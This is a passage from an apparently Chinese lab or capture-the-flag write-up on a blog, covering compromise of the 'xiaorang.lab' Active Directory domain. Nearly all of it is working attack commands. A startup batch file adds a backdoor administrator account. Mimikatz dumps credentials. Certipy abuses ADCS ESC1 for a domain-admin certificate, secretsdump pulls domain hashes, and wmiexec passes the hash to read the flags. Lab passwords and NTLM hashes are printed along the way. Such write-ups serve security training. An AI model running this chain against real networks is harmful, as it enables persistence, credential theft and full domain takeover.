+<div class="c-code"><div class="c-code__header"><div class="c-code__dots"><span class="red"></span><span class="yellow"></span><span class="green"></span></div><div class="c-code__lang is-empty"></div><div class="c-code__actions"><button class="c-code__btn c-code__btn--copy" title="Copy code"><i class="fas fa-copy"></i></button><button class="c-code__btn c-code__btn--fold" title="Fold code"><i class="fas fa-chevron-up"></i></button></div></div><div class="c-code__content"><pre tabindex="0" class="chroma"><code><span class="line"><span class="cl">proxychains bloodhound-python -d xiaorang.lab -u yangdming -p kier@n10 -gc dc.xiaorang.lab -c all
+</span></span></code></pre></div></div><p>然后发现<code>yangdming</code>这个用户在SHUWDOWN_GROUP，能对机器重启，因此我们可以使用启动项提权，首先在本地写一个add.bat，具体内容：把yangdming添加到本地管理员组内，把LocalAccountTokenFilterPolicy设为1，添加benbi后门用户：</p>
+<div class="c-code"><div class="c-code__header"><div class="c-code__dots"><span class="red"></span><span class="yellow"></span><span class="green"></span></div><div class="c-code__lang is-empty"></div><div class="c-code__actions"><button class="c-code__btn c-code__btn--copy" title="Copy code"><i class="fas fa-copy"></i></button><button class="c-code__btn c-code__btn--fold" title="Fold code"><i class="fas fa-chevron-up"></i></button></div></div><div class="c-code__content"><pre tabindex="0" class="chroma"><code><span class="line"><span class="cl">@echo off
+</span></span><span class="line"><span class="cl">net localgroup administrators yangdming /add
+</span></span><span class="line"><span class="cl">reg ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
+</span></span><span class="line"><span class="cl">net user benbi pass@123 /add
+</span></span><span class="line"><span class="cl">net localgroup administrators benbi /add
+</span></span></code></pre></div></div><p>然后切换到<code>C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp</code>\把add.bat从本地传上去，接着shutdown重启机器</p>
+<div class="c-code"><div class="c-code__header"><div class="c-code__dots"><span class="red"></span><span class="yellow"></span><span class="green"></span></div><div class="c-code__lang is-empty"></div><div class="c-code__actions"><button class="c-code__btn c-code__btn--copy" title="Copy code"><i class="fas fa-copy"></i></button><button class="c-code__btn c-code__btn--fold" title="Fold code"><i class="fas fa-chevron-up"></i></button></div></div><div class="c-code__content"><pre tabindex="0" class="chroma"><code><span class="line"><span class="cl">cd &#34;C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\&#34;
+</span></span><span class="line"><span class="cl">upload add.bat
+</span></span><span class="line"><span class="cl">shutdown -r -t 0
+</span></span></code></pre></div></div><p><code>proxychains python3 wmiexec.py benbi:pass@123@172.22.61.34</code></p>
+<p>拿到flag</p>
+<div class="c-code"><div class="c-code__header"><div class="c-code__dots"><span class="red"></span><span class="yellow"></span><span class="green"></span></div><div class="c-code__lang is-empty"></div><div class="c-code__actions"><button class="c-code__btn c-code__btn--copy" title="Copy code"><i class="fas fa-copy"></i></button><button class="c-code__btn c-code__btn--fold" title="Fold code"><i class="fas fa-chevron-up"></i></button></div></div><div class="c-code__content"><pre tabindex="0" class="chroma"><code><span class="line"><span class="cl">upload /tmp/m/mimidrv.sys .
+</span></span><span class="line"><span class="cl">upload /tmp/m/mimilib.dll .
+</span></span><span class="line"><span class="cl">upload /tmp/m/mimispool.dll .
+</span></span><span class="line"><span class="cl">upload /tmp/m/mimikatz.exe .
+</span></span></code></pre></div></div><p><code>mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords&quot; &quot;exit&quot; &gt; 1.txt</code></p>
+<p>用猕猴桃抓用户哈希</p>
+<p>发现域内存在ADCS，用certipy探测一下，记得用机器用户的哈希，探测后发现存在ADCS ESC1</p>
+<div class="c-code"><div class="c-code__header"><div class="c-code__dots"><span class="red"></span><span class="yellow"></span><span class="green"></span></div><div class="c-code__lang">sh</div><div class="c-code__actions"><button class="c-code__btn c-code__btn--copy" title="Copy code"><i class="fas fa-copy"></i></button><button class="c-code__btn c-code__btn--fold" title="Fold code"><i class="fas fa-chevron-up"></i></button></div></div><div class="c-code__content" data-lang="sh"><pre tabindex="0" class="chroma"><code><span class="line"><span class="cl">proxychains certipy find -u win2012<span class="se">\$</span>@xiaorang.lab -hashes 00000000000000000000000000000000:41a258d72365350640270508748c9675 -dc-ip 172.22.61.17 -vulnerable
+</span></span><span class="line"><span class="cl">cat 20231030050124_Certipy.txt
+</span></span></code></pre></div></div><p>发现win2012可利用模板，为域管请求证书，转换格式，请求TGT</p>
+<p>(记得把域控加到/etc/hosts里)</p>
+<p><code>proxychains certipy req -u win2012\$@xiaorang.lab -hashes 00000000000000000000000000000000:41a258d72365350640270508748c9675 -target 172.22.61.17 -ca xiaorang-DC-CA-CA -template win2012 -upn administrator@xiaorang.lab</code></p>
+<p><code>proxychains certipy auth -pfx administrator.pfx -dc-ip 172.22.61.17</code></p>
+<p>导出域内哈希 <code>proxychains python3 secretsdump.py xiaorang.lab/administrator@172.22.61.17 -just-dc -hashes aad3b435b51404eeaad3b435b51404ee:e26a28fd9daa8a6a4d3c5adbbdcb0f53</code></p>
+<p>拿到域管哈希</p>
+<div class="c-code"><div class="c-code__header"><div class="c-code__dots"><span class="red"></span><span class="yellow"></span><span class="green"></span></div><div class="c-code__lang is-empty"></div><div class="c-code__actions"><button class="c-code__btn c-code__btn--copy" title="Copy code"><i class="fas fa-copy"></i></button><button class="c-code__btn c-code__btn--fold" title="Fold code"><i class="fas fa-chevron-up"></i></button></div></div><div class="c-code__content"><pre tabindex="0" class="chroma"><code><span class="line"><span class="cl">proxychains python3 wmiexec.py xiaorang.lab/administrator@172.22.61.17 -hashes aad3b435b51404eeaad3b435b51404ee:e26a28fd9daa8a6a4d3c5adbbdcb0f53
+</span></span><span class="line"><span class="cl">type C:\Users\Administrator\flag\flag04.txt
+</span></span></code></pre></div></div><p>最后回头拿第一个</p>
+<div class="c-code"><div class="c-code__header"><div class="c-code__dots"><span class="red"></span><span class="yellow"></span><span class="green"></span></div><div class="c-code__lang is-empty"></div><div class="c-code__actions"><button class="c-code__btn c-code__btn--copy" title="Copy code"><i class="fas fa-copy"></i></button><button class="c-code__btn c-code__btn--fold" title="Fold code"><i class="fas fa-chevron-up"></i></button></div></div><div class="c-code__content"><pre tabindex="0" class="chroma"><code><span class="line"><span class="cl">proxychains python3 wmiexec.py xiaorang.lab/administrator@172.22.61.50 -hashes aad3b435b51404eeaad3b435b51404ee:e26a28fd9daa8a6a4d3c5adbbdcb0f53
+</span></span><span class="line"><span class="cl">type C:\Users\Administrator\flag\flag01.txt
+</span></span></code></pre></div></div><p>卡死了 ,体验差死了</p>
+</article>
+
+        <nav class="c-post__nav">
+            
+            <a href="/post/brute4road" class="c-post__nav-card c-post__nav-card--prev">
+                <h3>‹ 上一篇</h3>
+                <p class="c-post__nav-title">Brute4Road</p>
+            </a>
+            
+
+            
+            <a href="/post/certify" class="c-post__nav-card c-post__nav-card--next">
+                <h3>下一篇 ›</h3>
+                <p class="c-post__nav-title">Certify</p>
+            </a>
+            
+        </nav>
+    </div>
+</div>
+
+    </main>
+    <footer class="c-footer">
+        <span id="jinrishici-sentence" class="c-footer__quote">今日诗词加载中....</span>
+        <div class="c-footer__copy">
+            Copyright © <span id="currentYear">2025</span> Dionysus. All rights reserved.
+        </div>
+    </footer>
+</div>
+
+<div id="algolia-search-mask" class="c-search-mask"></div>
+<div id="algolia-search-modal" class="c-search-modal">
+    <div class="c-search-modal__box">
+        <div class="c-search-modal__header">搜索</div>
+        <div class="c-search-modal__summary" id="algolia-search-summary" style="display:none;">共找到 0 条结果</div>
+        <input type="text" id="algolia-search-input" class="c-search-modal__input" placeholder="请输入关键词..." />
+        <div id="algolia-search-results" class="c-search-modal__results"></div>
+        <div id="algolia-pagination" class="c-search-modal__pagination"></div>
+        <hr class="c-search-modal__divider" />
+    </div>
+</div>
+
+<script src='https://static.dionysus.zip/static/js/app-IJHRYWUS.js' defer></script>
+
+
+<script src="https://cdn.jsdelivr.net/npm/algoliasearch@4/dist/algoliasearch-lite.umd.js" defer></script>
+<script src="https://sdk.jinrishici.com/v2/browser/jinrishici.js" charset="utf-8" defer></script>
+</body>
+</html>
+
